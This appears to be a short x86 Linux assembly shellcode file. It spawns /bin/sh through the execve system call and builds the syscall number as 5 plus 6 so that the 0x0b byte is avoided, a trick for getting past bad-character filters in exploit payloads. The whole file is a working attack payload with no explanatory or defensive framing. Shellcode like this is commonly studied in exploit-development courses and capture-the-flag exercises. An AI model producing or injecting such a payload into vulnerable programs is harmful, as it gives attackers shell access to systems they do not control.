global _start

section .text

_start:
    xor eax, eax; safe null
    push eax; push null byte onto stack
    push 0x68732f2f ; push /bin//sh
    push 0x6e69622f
    mov ebx,esp ; set ebx to out cmd
    mov ecx, eax; no args
    mov edx, eax ; no args again
    mov al, 5 ; set sys_execve & and avoid 0x0b byte
    add al, 6
    int 0x80 ; trigger interrupt

section .data
